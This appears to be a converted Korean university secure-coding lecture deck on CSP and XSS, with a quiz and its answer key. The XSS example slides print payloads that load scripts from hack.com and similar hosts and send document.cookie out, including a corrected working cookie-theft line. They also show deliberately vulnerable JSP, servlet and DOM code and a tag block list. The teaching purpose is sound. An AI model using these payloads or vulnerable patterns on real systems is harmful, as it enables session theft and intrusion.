## [2-SLIDES] 7주차 1차시 p.23 · CSP(Content Security Policy) 적용
CSP(Content Security Policy) 적용
CSP란?
허용하는 콘텐츠 출처를 명시적으로 정의하여, XSS, 데이터 인젝션 등 악의적 콘텐츠 실행을 방지하는 보안 표준
HTTP 응답 헤더(또는 HTML 메타 태그)를 통해 정책을 브라우저에 전달
CSP 적용의 필요성
- XSS 공격 완화: 스크립트 인젝션 시 공격자가 실행 가능한 스크립트 소스를 제한
- 데이터 무결성 보장: 외부 악성 리소스 로드를 방지하여, 안전한 콘텐츠만 렌더링
- 보안 강화를 위한 추가 레이어: 기존 보안 조치와 함께 적용 시 다중 방어 체계 구축
출처: https://www.securing.pl/en/why-should-you-care-about-content-security-policy/

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[도식: CSP 동작 예시]** (슬라이드 오른쪽 하단, 출처 securing.pl)
- 왼쪽 노트북(브라우저) ↔ 오른쪽 서버 랙
- `https://securing.pl/assets/file.js` — 초록 양방향 화살표(허용, 도메인 `securing.pl` 초록색 강조)
- `https://securing.pl/assets/file.jpg` — 초록 양방향 화살표(허용)
- `https://malicious.com/assets/file.js` — 도메인 `malicious.com` 빨간색 강조, 빨간 X 표시와 `blocked:CSP`
→ 정책에 허용된 출처(자기 도메인)의 리소스만 로드되고, 허용되지 않은 외부 악성 도메인의 스크립트는 CSP에 의해 차단됨

---

## [2-SLIDES] 7주차 1차시 p.24 · CSP(Content Security Policy) 적용
CSP(Content Security Policy) 적용
주요 CSP 지시문
- default-src: 기본 콘텐츠 출처 지정 (예: 'self')
- script-src: 스크립트 출처 제한 (신뢰된 도메인 및 inline 스크립트 제한)
- style-src: 스타일시트 출처 제한
- img-src: 이미지 로드 출처 지정
- connect-src: AJAX, WebSocket, API 호출 등 네트워크 요청 출처 제한
- report-uri / report-to: 정책 위반 시 리포트 전송
- 구성 방법
- HTTP 헤더 설정:
(예)
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';
- Meta 태그 사용 (보조 방식):
(예) <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
예시 정책 정리 (코드):
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';
```
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```
- HTTP 헤더 예시: 기본은 자기 출처('self')만 허용, 스크립트는 자기 출처 + `https://trusted.cdn.com`만 허용, `object-src 'none'`으로 플러그인 객체(`<object>`/`<embed>`) 로드를 전부 금지
- Meta 태그 예시: 기본·스크립트 모두 자기 출처만 허용
(※ 검증: Python으로 지시문 파싱 — 헤더 `{'default-src': ["'self'"], 'script-src': ["'self'", 'https://trusted.cdn.com'], 'object-src': ["'none'"]}`, 메타 `{'default-src': ["'self'"], 'script-src': ["'self'"]}`로 구문 정상, 마지막 `;`도 허용됨 — 일치. 참고: `object-src`는 위 '주요 CSP 지시문' 목록에는 없는 지시문이며, `report-uri`/`frame-ancestors`/`sandbox` 등은 meta 태그 방식에서는 지원되지 않아 HTTP 헤더 방식이 기본임)

---

## [2-SLIDES] 7주차 1차시 p.25 · 요약 정리
요약 정리
- 프론트엔드는 SSR·CSR 방식을 통해 사용자 입력을 주고받으며, UI를 동적으로 갱신합니다.
- DOM 조작과 로컬 저장소, CORS 설정 등 다양한 보안 이슈가 존재하므로, JavaScript 실행 환경의
취약점을 인식해야 합니다.
- 입력 값 검증·필터링으로 악의적 코드 삽입을 차단하고, 서버 측 재검증을 더해 보안을 이중화 합니다.
- CSP(Content Security Policy) 를 활용해 XSS·인젝션 공격을 완화할 수 있습니다.
- 코드 리뷰와 자동화된 CI/CD 파이프라인 보안 테스트를 통해 취약점을 조기에 발견·수정해야 합니다.

---

## [2-SLIDES] 7주차 1차시 p.26 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 7주차 1차시 p.27 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 7주차 1차시 p.28 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**1. 다음 중 로컬 저장소(LocalStorage)에 민감 정보를 저장했을 때 발생할 수 있는 문제가 아닌 것은 ?**

1) XSS 공격이 성공하면 로컬 저장소 내용이 유출될 수 있다.
2) 로컬 저장소는 기본적으로 평문으로 저장된다.
3) 도메인이 다르면 로컬 저장소를 공유할 수 있다.
4) 악성 스크립트가 로컬 저장소 내용을 임의로 변경할 수 있다.

**2. SSR(Server-Side Rendering)과 CSR(Client-Side Rendering)에 대한 설명으로 옳은 것은 ?**

1) SSR은 브라우저가 기본 HTML만 받고, 모든 UI를 JavaScript로 구성한다.
2) CSR은 서버에서 데이터를 주입해 완성된 HTML을 전송한다.
3) SSR은 서버에서 HTML을 완성해 응답하고, CSR은 클라이언트가 JS로 화면을 동적으로 구성한다.
4) CSR은 검색 엔진 최적화(SEO)에 매우 유리하며, SSR은 초기 로딩이 느리다.

**3. 프론트엔드에서 외부 스크립트나 스타일의 로딩 출처를 제한해 XSS 같은 공격을 완화하기 위해 사용하는 보안 정책은 ? (영문 3글자)**

(　　　　　　)

---

## [2-SLIDES] 7주차 1차시 p.29 · 퀴즈 정답
퀴즈 정답
1. 다음 중 로컬 저장소(LocalStorage)에 민감 정보를 저장했을 때 발생할 수 있는 문제가 아닌 것은 ?
3) 도메인이 다르면 로컬 저장소를 공유할 수 있다.
Same-Origin Policy로 인해, 도메인이 다르면 로컬 저장소를 공유할 수 없습니다.
2. SSR(Server-Side Rendering)과 CSR(Client-Side Rendering)에 대한 설명으로 옳은 것은 ?
3) SSR은 서버에서 HTML을 완성해 응답하고, CSR은 클라이언트가 JS로 화면을 동적으로 구성한다.
SSR은 서버가 완성된 HTML을, CSR은 브라우저가 JS로 동적 화면을 구성하는 방식입니다.
3. 프론트엔드에서 외부 스크립트나 스타일의 로딩 출처를 제한해 XSS 같은 공격을 완화하기 위해 사용하는
보안 정책은 ? (영문 3글자)
( CSP )

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
- 정답 보기(`3) 도메인이 다르면…`, `3) SSR은 서버에서…`)와 3번 정답 `CSP`는 슬라이드에서 빨간 글씨로 표시됨.
(※ 검증: 1번 해설의 '도메인'은 정확히는 출처(origin = 스킴+호스트+포트) 단위 — localStorage는 출처별로 분리되므로 같은 도메인이라도 http/https나 포트가 다르면 공유되지 않음. 정답 자체는 맞음)

# [2-SLIDES] 7주차 2차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · PreparedStatement/프리페어드 스테이트먼트/파라미터 바인딩/바인딩/setString · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · Reflected XSS/반사형 XSS/리플렉티드 · Stored XSS/저장형 XSS/스토어드 · DOM XSS/DOM 기반 XSS/돔 기반/document.write/innerHTML · CSRF/Cross-Site Request Forgery/크로스사이트 요청 위조/크로스 사이트 요청 위조/XSRF/CWE-352 · CSP/Content Security Policy/콘텐츠 보안 정책/컨텐츠 시큐리티 폴리시 · SameSite/세임사이트/Strict/Lax/None · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링

## [2-SLIDES] 7주차 2차시 p.1 · XSS 취약점 진단 및 대응
XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

## [2-SLIDES] 7주차 2차시 p.2 · 📌
📌
학습 목표
✅
XSS(크로스 사이트 스크립팅)의 개념과 유형을 이해한다.
✅
실제 XSS 공격 기법을 학습하고, 취약점 진단 방법을 익힌다.
✅
XSS 방어 기법을 적용하여 웹 애플리케이션 보안을 강화할 수 있다.

---

## [2-SLIDES] 7주차 2차시 p.3 · 📍
📍
학습 내용
1. XSS 취약점 이해
2. XSS 취약점 진단
3. XSS 취약점 방어

---

## [2-SLIDES] 7주차 2차시 p.4 · XSS 취약점 진단 및 대응
XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

## [2-SLIDES] 7주차 2차시 p.5 · XSS(크로스 사이트 스크립팅) 이란?
XSS(크로스 사이트 스크립팅) 이란?
XSS 개요
검증되지 않은 외부 입력 값을 웹 응답에 그대로 반영하여 악의적 스크립트가 실행되는 취약점
→ 사용자 브라우저에서 악성 코드가 동작해, 쿠키· 세션 등 민감 정보 탈취 가능
발생 원인
- 외부에서 입력된 사용자 입력 값을 검증하지 않고 그대로 응답에 반영
- DB에 저장된 데이터를 읽어서 출력할 때 DB에서 읽어온 값을 검증하지 않고 출력 값으로 사용
- 자바스크립트로 DOM구조를 조작하여 페이지를 변경하는 경우 변경되는 내용을 검증하지 않고 브라우저에 표시하는 경우
예상되는 피해
이 취약점으로 인해 해당 사용자 PC는 악성코드를 다운로드 받아 좀비 PC가 되거나,
사용자가 피싱 사이트로 접속되게 하거나, 사용자의 중요 정보를 공격자에게 전송하는 침해사고를 당할 수 있음

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[그림] 오른쪽 위: 후드와 복면을 쓴 해커가 노트북 앞에 앉아 있고, 뒤의 모니터 화면에 "XSS <script>" 글자와 빨간 경고 폭발 아이콘(!)이 표시된 일러스트. 노트북에서 주사기 모양 아이콘이 화면 쪽으로 향함(악성 스크립트 주입을 상징).

---

## [2-SLIDES] 7주차 2차시 p.6 · XSS 취약점 공격 흐름
XSS 취약점 공격 흐름
1. 공격자
악성 스크립트 삽입(예: <script>evil('XSS');</script>)
2. 웹 애플리케이션
입력 값 검증 없이 페이지에 반영하거나 DB에 저장
3. 피해 사용자
페이지 접속 시 악성 스크립트가 브라우저에서 실행
→ 쿠키·세션 탈취, 임의 명령 수행 등 피해 발생

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[그림] 오른쪽 흐름 도식 (상단 제목 "XSS", 아래에 왼쪽→오른쪽 진행 화살표)
- 공격자(복면 쓴 인물)의 노트북 화면: `<script> evil()` → (화살표) →
- 웹 애플리케이션(웃는 얼굴의 서버) 문서: `<script> evil() </script>` → (화살표) →
- 피해 사용자(화난 표정, 머리 위 빨간 폭발 표시)의 노트북 화면: `<script> evil()`
즉 공격자가 넣은 스크립트가 서버를 거쳐 피해자 브라우저에서 그대로 실행되는 1→2→3 단계를 그림으로 표현.

---

## [2-SLIDES] 7주차 2차시 p.7 · XSS 취약점 유형
XSS 취약점 유형
Reflected XSS
사용자 입력이 즉시 반영되어 페이지에 표시
검색창, URL 파라미터 등을 통해 스크립트가 반사되어 실행
Stored XSS
게시판, 댓글, 프로필 등 DB에 악성 스크립트가 저장되어 다수 사용자에게 전파
DOM 기반 XSS
클라이언트 측 스크립트(DOM 조작)에서 발생
location.hash, location.search 등 브라우저 객체를 통한 동적 스크립트 삽입

---

## [2-SLIDES] 7주차 2차시 p.8 · XSS 취약점 공격 피해
XSS 취약점 공격 피해
세션 쿠키 탈취
자동 로그인, 권한 정보 등 노출
사용자 계정·개인정보 유출
폼에 입력된 민감 데이터(이메일, 전화번호, 카드번호 등) 탈취
브라우저 무단 제어
임의 스크립트 실행 → 가짜 폼 표시, 피싱 페이지로 이동, 내부 네트워크 스캔 등
기업 이미지 타격
보안 사고 발생 시 신뢰도 하락, 법적 책임 가능성

---

## [2-SLIDES] 7주차 2차시 p.9 · XSS 취약점 진단 및 대응
XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

## [2-SLIDES] 7주차 2차시 p.10 · XSS 공격 유형 및 기법 – Reflected XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

사용자가 요청한 값을 서버에서 검증하지 않고 응답으로 사용하는 경우 발생

[도식] 공격자(노트북) → 사용자(PC, 머리 위에 빨간 폭발 모양 "Script 실행") ↔ 서버

- ① 이메일로 URL 전달 (공격자 → 사용자)
- ② URL을 클릭하여 요청 (사용자 → 서버)
- ③ 공격자의 Script 전송 (서버 → 사용자)

빨간 점선 박스 1 (공격자가 보낸 이메일 내용, 노란 화살표로 사용자에게 전달됨):

```html
고객님이 요청하신 새로운 제품이 입고 되었습니다.
확인해보세요.
<a href =http://a.com/1.do?name=<script src=
“http://hack.com/hook.js”/>확인</a>
```

빨간 점선 박스 2 (서버 응답 화면, 노란 화살표로 서버 → 사용자에게 돌아옴):

```html
<script src=‘http://hack.com/hook.js”/> 님 환영합니다.
```

→ name 파라미터 값이 검증 없이 "○○ 님 환영합니다." 응답에 그대로 반영되어, 사용자의 브라우저에서 hack.com의 hook.js가 로드·실행됨.

(※ 원문 표기 그대로 — 응답 박스의 따옴표가 여는 쪽 `‘`(작은 곡선 따옴표), 닫는 쪽 `”`(큰 곡선 따옴표)로 짝이 맞지 않고, 이메일 박스도 곡선 따옴표 `“ ”` 사용)
(※ 검증: 개념 설명용 축약 예시. 실제 HTML에서는 ① `<script .../>` 처럼 자기 닫기로 쓴 script 태그는 닫힌 것으로 인정되지 않아 `</script>`가 필요하고, ② 곡선 따옴표는 속성값 구분자로 인식되지 않으며, ③ href 값이 따옴표 없이 쓰여 `<`, 공백 등에서 끊기므로 실제 링크에는 `name=%3Cscript%20src%3D...%3E%3C%2Fscript%3E`처럼 URL 인코딩된 페이로드를 넣어야 함)

---

## [2-SLIDES] 7주차 2차시 p.11 · XSS 공격 유형 및 기법 – Reflected XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**안전하지 않은 코드** (빨간 라벨)

```jsp
// JSP VULNERABLE code to XSS reflected #FAIL
<% String customerID = request.getParameter("id"); %>
Customer ID: <%= customerID %>

// code in a VULNERABLE Servlet to XSS reflected #FAIL
out.writeln("you searched for: "+request.getParameter("q"));
```
(코드 이미지에서 `customerID`(두 곳)와 `"q"`의 q가 빨간색으로 강조됨 — 외부 입력이 그대로 출력되는 지점)

id나 q의 값이 다음과 같은 패턴의 값이 입력된다면 XSS 공격이 실행되게 된다.

```text
http://mywebsite.com/customers?id=1234'><script src=http://ha.ckers.org/xss.js></script>'
http://mywebsite.com/customers?id=1234"><script>document.location='http://www.cgisecurity.com/cgi-bin/cookie.cgi?'%20+document.cookie</script>
```

(※ 검증: Python `urllib.parse.parse_qs`로 서버가 받는 id 값을 확인 — 첫 번째 URL은 `1234'><script src=http://ha.ckers.org/xss.js></script>'`가 그대로 전달되어 JSP 출력이 `Customer ID: 1234'><script src=http://ha.ckers.org/xss.js></script>'`가 됨 → 외부 스크립트 로드, 일치. 두 번째 URL은 쿼리스트링 디코딩 시 `%20`과 `+`가 모두 공백으로 바뀌어 `document.location='...cookie.cgi?'  document.cookie`가 되므로(Java `getParameter`도 동일하게 `+`→공백) 연결 연산자가 사라져 JS 문법 오류가 남. 실제로 쿠키를 붙이려면 `+`를 `%2B`로 인코딩해야 함 — 원문 예시는 OWASP 문서의 고전 예시를 그대로 옮긴 것)
(※ 원문 표기 그대로 — Java의 `PrintWriter`/`JspWriter`에는 `writeln` 메서드가 없음(`println`이 맞음). p.32 퀴즈에서는 `out.println(...)`으로 표기)

---

## [2-SLIDES] 7주차 2차시 p.12 · XSS 공격 유형 및 기법 – Reflected XSS
XSS 공격 유형 및 기법 – Reflected XSS
Reflected XSS LAB 시연 영상

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(시연 영상 영역 — PDF에는 영상/캡처 이미지가 포함되어 있지 않고 제목·문구 외에는 빈 화면)

---

## [2-SLIDES] 7주차 2차시 p.13 · XSS 공격 유형 및 기법 – Stored XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

공격자가 서버에 저장한 스크립트를 사용자가 열람하는 경우 스크립트가 다운로드 되어 사용자의 브라우저에서 실행

[도식] 공격자 / 서버 / 데이터베이스 / 사용자(PC 위에 빨간 폭발 모양 "Script 실행")

- ① Script 삽입 글 등록 (공격자 → 서버)
- ② Script 삽입 글 저장 (서버 → 데이터베이스)
- ③ 공격자의 글 열람 (사용자 → 서버)
- ④ 공격자의 Script 전송 (데이터베이스 → 서버 → 사용자)
- ⑤ 사용자 정보 획득 (사용자 → 공격자) — 옆의 빨간 점선 박스: **쿠키값전달** (노란 화살표로 공격자 쪽을 가리킴)

빨간 점선 박스(아래, 노란 화살표로 ① 등록 경로를 가리킴):

```html
게시물을 작성하여 DB에 저장
<script src=“http://hack.com/receive.do?param=“+document.cookie/>
```

빨간 점선 박스(위, 노란 화살표로 사용자 쪽을 가리킴 — 사용자 브라우저에서 실행되는 스크립트):

```html
<script src=“http://hack.com/receive.do?param=“+document.cookie/>
```

(※ 원문 표기 그대로 — 곡선 따옴표 `“`가 여닫는 쪽 모두 같은 모양)
(※ 검증: 개념 설명용 축약 예시. src 속성값은 문자열일 뿐 JavaScript로 평가되지 않으므로 `+document.cookie`가 쿠키 값으로 치환되지 않으며, `<script .../>` 자기 닫기도 HTML에서 인정되지 않음. 실제로 쿠키를 전송하는 형태는 예: `<script>new Image().src='http://hack.com/receive.do?param='+document.cookie</script>`)

---

## [2-SLIDES] 7주차 2차시 p.14 · XSS 공격 유형 및 기법 – Stored XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

다음 서블릿 코드는 Stored XSS에 취약하다.

**안전하지 않은 코드** (빨간 라벨)

```java
final String id = httpRequest.getParameter ("id")        // parameter from the request
final String sql = "SELECT * FROM Customers WHERE CustomerID =?";
final PreparedStatement ps = con.prepareStatement (sql);
ps.setString (1, id);
ResultSet rs = ps.executeQuery ();
```

PreparedStatement는 SQL Injection을 예방하기는 하지만 XSS 취약점에 대해서는 예방책이 없다.
DB에서 읽어온 데이터를 체크하지 않고 그대로 HTML 페이지에 보내준다.

```java
out.writeln (<tr> <td> "+ rs.getString (" name ")+"</ td> <td> "+
                         rs.getString (" comment ")+"</ td></ tr> ");
```

(※ 검증: 바인딩 변수 `?`에 `setString(1, id)`로 값을 넣으므로 SQL 쿼리 구조는 `SELECT * FROM Customers WHERE CustomerID =?` 그대로 유지되어 SQL Injection은 방지됨 — 설명과 일치. 그러나 name/comment 컬럼에 저장된 `<script>...` 문자열은 이스케이프 없이 HTML로 출력되므로 Stored XSS 발생 — 설명과 일치)
(※ 원문 표기 그대로 — 컴파일되지 않는 축약 코드: 첫 줄 끝 `;` 누락, `out.writeln (` 뒤 여는 따옴표 누락(`("<tr><td>"+`가 맞음), `writeln`은 Java에 없는 메서드(`println`), `" name "`·`" comment "`처럼 컬럼명 앞뒤 공백, `</ td>`·`</ tr>`처럼 닫는 태그 안의 공백)

---

## [2-SLIDES] 7주차 2차시 p.15 · XSS 공격 유형 및 기법 – Stored XSS
XSS 공격 유형 및 기법 – Stored XSS
- Stored XSS LAB 시연 영상

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(시연 영상 영역 — PDF에는 영상/캡처 이미지가 포함되어 있지 않고 제목·문구 외에는 빈 화면)

---

## [2-SLIDES] 7주차 2차시 p.16 · XSS 공격 유형 및 기법 – DOM 기반 XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

자바스크립트로 DOM 객체 정보를 사용하여 Document에 write를 수행하는 경우
스크립트가 사용자의 브라우저에서 실행

[도식] 사용자(PC, 머리 위 빨간 폭발 모양 "Script 실행") ↔ 서버

- ① `http://a.com/hello.do` : 사용자 로그인 요청 (사용자 → 서버)
- ② `http://a.com/good.do?menu=요청처리함` : 초기 화면인 '요청처리함'으로 리다이렉트 (서버 → 사용자)
- ③ 공격자는 파악된 URL 내용을 변조하여 사용자가 링크를 클릭하도록 피싱메일 등으로 유도 (빨간 글씨)
- ④ `http://a.com/good.do?menu=<script src=http://hack.com/do.js/>` : 사용자가 악성 URL 클릭 (빨간 글씨, 사용자 → 서버)
- ⑤ 정상적으로 “요청처리함” 화면 표시 (서버 → 사용자)
- ⑤ (사용자 아래의 순환 화살표, 빨간 글씨) 자바스크립트로 URL의 일부인 menu 값을 document.write()로 화면에 출력하는 경우 브라우저에서 스크립트가 실행

→ 서버 응답 자체는 정상이지만, 클라이언트 측 스크립트가 URL의 menu 값을 DOM에 써 넣는 과정에서 스크립트가 실행됨.

(※ 원문 표기 그대로 — ⑤ 번호가 두 번 사용됨)
(※ 검증: `<script src=http://hack.com/do.js/>`에서 따옴표 없는 src 값은 공백이나 `>` 전까지이므로 `http://hack.com/do.js/`(끝에 `/` 포함)로 해석되고, 닫는 `</script>`가 없어 실제로는 동작이 불확실 — 개념 설명용 축약 예시)

---

## [2-SLIDES] 7주차 2차시 p.17 · XSS 공격 유형 및 기법 – DOM 기반 XSS
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**안전하지 않은 코드** (빨간 라벨)

```html
<script>
   var  a= document.URL;
   a=decodeURIComponent(a);
   document.write(a.substring(a.indexOf(“message=“)+8, a.length);
</script>
```

해당 스크립트는 메시지 매개변수의 값을 추출하기 위해
URL 매개변수에서 message= 의 값으로 전달되는 값을 추출하여
HTML 에 추가하여 사용자에게 보여준다.

URL 값이 다음과 같다면 공격자가 의도한 스크립트가 해당 브라우저에 실행된다.

```text
http://example.com/error.jsp?message=<script>alert('xss');</script>
```
(이 URL은 슬라이드에서 빨간 글씨로 강조)

(※ 검증: Python으로 동작 재현 — `len("message=") = 8`이므로 `indexOf("message=")+8`은 값의 시작 위치가 맞고, 추출 결과는 `<script>alert('xss');</script>`. 브라우저가 `<`, `>`를 `%3C`, `%3E`로 인코딩해 document.URL에 넣더라도 `decodeURIComponent`로 다시 복원되므로 document.write로 그대로 삽입되어 실행됨 — 설명과 일치)
(※ 원문 표기 그대로 — `“message=“`에 곡선 따옴표가 쓰여 있고 `document.write(` 의 닫는 괄호 `)`가 하나 부족함. 실제 코드라면 `document.write(a.substring(a.indexOf("message=")+8, a.length));`)

---

## [2-SLIDES] 7주차 2차시 p.18 · XSS 공격 유형 및 기법 – DOM 기반 XSS
XSS 공격 유형 및 기법 – DOM 기반 XSS
- DOM 기반 XSS 시연 영상

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(시연 영상 영역 — PDF에는 영상/캡처 이미지가 포함되어 있지 않고 제목·문구 외에는 빈 화면)

---

## [2-SLIDES] 7주차 2차시 p.19 · 사고 사례
사고 사례

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[왼쪽 이미지] 경향신문(경제 섹션) 기사 캡처 — 제목 "대성학원·시대인재 해킹…수험생 11만명 정보 유출", 입력 2024.03.28 21:07.
(기사 본문 요약 — 저작권 보호를 위해 원문 대신 요약)
- 두 회사 모두 해킹으로 수강생 개인정보가 유출되었고 사고 후 대응도 미흡했다는 내용.
- **빨간 박스로 강조된 부분**: 디지털대성은 1월 12~16일 공격을 받음. 해커는 먼저 다른 곳에서 확보한 아이디·비밀번호를 무작위로 대입하는 크리덴셜 스터핑으로 회원 A의 계정을 탈취하고, 그 계정으로 불법이용 신고 게시판에 악성 스크립트가 든 글을 올림. 직원이 이 글을 열람하면서 스크립트가 실행되는 XSS 공격이 일어나 내부 보안 정보가 유출됨.
- 이후 부분: 이 공격으로 디지털대성 회원 약 9만5000명의 개인정보가 유출되었고, 보안시스템이 있었지만 급증한 로그인 시도를 탐지하지 못했으며, 유출 사실 인지 후 72시간이 지나서야 알렸다는 내용.

[오른쪽 도식] < 개인정보 유출 경위 >
- 크리덴셜 스터핑 공격 (점선 박스): 해커 → ① 무작위 로그인 시도 ('24. 1. 12. 12:01) → 로그인 화면(아이디/비밀번호 입력, 네이버·카카오 로그인 버튼) → 회원 A 계정 탈취
- XSS 공격 (점선 박스): 회원 A → ② 악성 스크립트 삽입 ('24. 1. 15. 17:05) → 불법이용 신고 게시판 → ③ 게시글 열람 ('24. 1. 16. 09:04, 직원 A, B) → ④ 직원 A,B 세션 탈취 → 직원 A, B 세션
- 직원 A, B 세션으로 → ⑤ 서비스 접속 ('24. 1. 16. 11:18 / '24. 1. 16. 14:10) → 관리용 웹 서비스 → ⑥ 개인정보 열람 (문서 아이콘)

→ 계정 탈취 후 Stored XSS로 관리자(직원) 세션을 훔쳐 관리 시스템에 접속한 실제 사례.

---

## [2-SLIDES] 7주차 2차시 p.20 · XSS 취약점 진단 및 대응
XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

## [2-SLIDES] 7주차 2차시 p.21 · 입출력 값 검증 및 필터링
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**제한적인 입력 값 허용**
클라이언트 프로그램과 서버 애플리케이션에서 HTTP 헤더, 쿠키, 쿼리 스트링, 폼 필드, 히든 필드 등의 모든 인자들에 대해
허용된 유형의 데이터만을 받아들이도록 정규식을 이용하여 제한된 입력 값을 받아서 처리하도록 한다.

**제한적인 출력 값 허용**
입력 값이나 DB에서 조회한 결과 값을 응답으로 내보내기전에
XssFilter를 적용하여 동적으로 스크립트가 실행될 수 있는 요소들은 HTML인코딩을 적용하여 출력한다.

• 필터링 또는 변환되어야 하는 특수문자들

| 일반 | URL Encoding | HTML Encoding | 일반 | URL Encoding | HTML Encoding | 일반 | URL Encoding | HTML Encoding |
|---|---|---|---|---|---|---|---|---|
| ' | %27 | &#x27; &apos; | [ | %5b | &#x5b; | % | %25 | &#x25; |
| " | %22 | &#x22; &quot; | ] | %5d | &#x5d; | & | %26 | &#x26; &amp; |
| : | %3a | &#x3a; | { | %7b | &#x7b; | ? | %3f | &#x3f; |
| ; | %3b | &#x3b; | } | %7d | &#x7d; | ! | %21 | &#x21; |
| ( | %28 | &#x28; | ` | %60 | &#x60; | @ | %40 | &#x40; |
| ) | %29 | &#x29; | = | %3d | &#x3d; | * | %2a | &#x2a; |
| < | %3c | &#x3c; &lt; | # | %23 | &#x23; | TAB | %09 | &#x09; |
| > | %3e | &#x3e; &gt; | $ | %24 | &#x24; | \| | %7c | &#x7c; |

(※ 검증: Python으로 24개 문자 모두 확인 — `urllib.parse.unquote`(URL 인코딩)와 `html.unescape`(16진 숫자 참조·이름 참조) 결과가 각 원문자와 일치. 참고로 `&apos;`는 HTML5/XML에서 정의된 이름 참조로, 구형 HTML4 브라우저 호환이 필요하면 `&#x27;` 사용)

---

## [2-SLIDES] 7주차 2차시 p.22 · 입출력 값 검증 및 필터링
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

차단되어야 하는 태그들

| | | |
|---|---|---|
| `<script>` | `<object>` | `<img>` |
| `<javascript>` | `<marquee>` | `<embed>` |
| `<vbscript>` | `<qss>` | `<table>` |
| `<livescript>` | `<body>` | `<isindex>` |
| `<iframe>` | `<input>` | `<meta>` |
| `<frameset>` | `<form>` | `<http-equiv>` |
| `<mocha>` | `<div>` | `<xss>` |
| `<applet>` | `<style>` | `<href>` |

(※ 검증: 원문 표의 일부는 실제 HTML 태그가 아님 — `javascript`, `vbscript`, `livescript`, `mocha`는 `javascript:` 같은 URL 스킴(스크립트 언어 이름), `http-equiv`(meta 태그 속성)와 `href`(a 태그 등의 속성)는 속성 이름, `<qss>`, `<xss>`는 표준 태그가 아님. 필터링 키워드 목록으로 이해하면 됨)

---

## [2-SLIDES] 7주차 2차시 p.23 · HTML 엔티티 이스케이프 처리
HTML 엔티티 이스케이프 처리
HTML 엔티티 이스케이프(Entity Escape) 란?
HTML 문서에서 특수 문자가 브라우저에 의해 태그나 코드로 해석되지 않도록,
해당 문자를 엔티티 코드(예: < → &lt;)로 변환하는 기법
XSS 공격 방어 방법
사용자 입력에 포함된 <script> 태그 등 악의적인 스크립트가 실행되지 않도록 보호
서버와 클라이언트 모두에서 출력 전에 반드시 이스케이프 처리 필요
적용해야 하는 위치
